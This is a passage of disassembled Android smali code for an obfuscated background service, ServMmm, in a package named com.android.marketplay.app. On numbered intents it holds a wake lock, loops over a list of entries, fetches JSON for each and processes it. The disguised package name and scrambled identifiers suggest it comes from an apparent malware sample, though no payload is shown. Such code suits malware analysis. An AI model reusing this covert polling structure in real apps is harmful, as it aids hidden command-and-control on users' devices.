    :catch_1
    move-exception v0

    const/4 v0, 0x0

    goto :goto_0

    :cond_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-direct {p0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Lorg/json/JSONObject;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0
.end method

.method private static a(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 2

    const/4 v0, 0x0

    invoke-virtual {p0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    const/4 v0, 0x1

    :cond_0
    return v0
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 8

    const/4 v2, 0x1

    const/4 v1, 0x0

    sget v4, Lcom/android/marketplay/app/daussjKJUxxxjqTwoGcIegDPRTvCiVnZ;->e:I

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v5

    const-string v0, "1"

    invoke-static {v5, v0}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-direct {p0}, Lcom/android/marketplay/app/ServMmm;->a()V

    :try_start_0
    new-instance v0, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;

    invoke-direct {v0, p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;-><init>(Landroid/content/Context;)V

    invoke-static {}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW()Ljava/util/ArrayList;

    move-result-object v6

    move v3, v1

    :goto_0
    invoke-virtual {v6}, Ljava/util/ArrayList;->size()I

    move-result v0

    if-lt v3, v0, :cond_0

    :goto_1
    iget-object v0, p0, Lcom/android/marketplay/app/ServMmm;->b:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    if-eqz v4, :cond_1

    :cond_0
    invoke-virtual {v6, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-direct {p0, p0, v0}, Lcom/android/marketplay/app/ServMmm;->a(Landroid/content/Context;Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    if-eqz v0, :cond_2

    const/4 v7, 0x1

    invoke-static {v7}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Z)V

    invoke-direct {p0, v0}, Lcom/android/marketplay/app/ServMmm;->a(Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    :cond_1
    :goto_2
    return-void

    :cond_2
    add-int/lit8 v0, v3, 0x1

    if-eqz v4, :cond_9

    :cond_3
    const-string v0, "2"

    invoke-static {v5, v0}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-direct {p0}, Lcom/android/marketplay/app/ServMmm;->a()V

    :try_start_1
    new-instance v5, Lcom/android/marketplay/app/YrZKkcheugaIkBUkbvzpSvvzKHepOcDW;

    invoke-direct {v5, p0}, Lcom/android/marketplay/app/YrZKkcheugaIkBUkbvzpSvvzKHepOcDW;-><init>(Landroid/content/Context;)V

    :cond_4
    invoke-virtual {v5}, Lcom/android/marketplay/app/YrZKkcheugaIkBUkbvzpSvvzKHepOcDW;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr()Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;

    move-result-object v6

    if-eqz v6, :cond_6

    new-instance v0, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;

    invoke-direct {v0, p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;-><init>(Landroid/content/Context;)V

    invoke-static {}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW()Ljava/util/ArrayList;

    move-result-object v7

    move v3, v1

    :goto_3
    invoke-virtual {v7}, Ljava/util/ArrayList;->size()I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v0

    if-lt v3, v0, :cond_5

    move v0, v1

    :goto_4
    if-eqz v0, :cond_6

    :try_start_2
    iget v0, v6, Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr:I

    invoke-virtual {v5, v0}, Lcom/android/marketplay/app/YrZKkcheugaIkBUkbvzpSvvzKHepOcDW;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    if-eqz v4, :cond_4

    :cond_5
    :try_start_3
    invoke-virtual {v7, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-direct {p0, p0, v6, v0}, Lcom/android/marketplay/app/ServMmm;->a(Landroid/content/Context;Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    if-eqz v4, :cond_8

    :cond_6
    iget-object v0, p0, Lcom/android/marketplay/app/ServMmm;->b:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    goto :goto_2

    :catch_1
    move-exception v0

    goto :goto_2

    :catch_2
    move-exception v0

    throw v0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :cond_7
    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto :goto_3

    :cond_8
    move v0, v2

    goto :goto_4

    :cond_9
    move v3, v0

    goto :goto_0
.end method
